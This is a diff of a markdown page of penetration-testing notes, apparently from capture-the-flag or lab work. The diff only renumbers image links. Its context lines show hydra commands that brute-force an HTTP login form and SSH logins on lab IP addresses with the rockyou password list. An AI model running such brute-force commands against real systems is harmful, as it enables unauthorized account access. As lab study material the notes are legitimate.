@@ -30,13 +30,13 @@ Examples:
 hydra -l molly -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.166.146 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
 ```
 
-![](<../../.gitbook/assets/image (90).png>)
+![](<../../.gitbook/assets/image (596).png>)
 
 ```bash
 hydra -l molly -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.166.146 -t 4 ssh
 ```
 
-![](<../../.gitbook/assets/image (73).png>)
+![](<../../.gitbook/assets/image (763).png>)
 
 ### SSH
 
@@ -44,4 +44,4 @@ hydra -l molly -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.166
 hydra -l joshua -P /usr/share/wordlists/rockyou.txt -V ssh://10.129.82.199
 ```
 
-<figure><img src="../../.gitbook/assets/image (656).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1012).png" alt=""><figcaption></figcaption></figure>
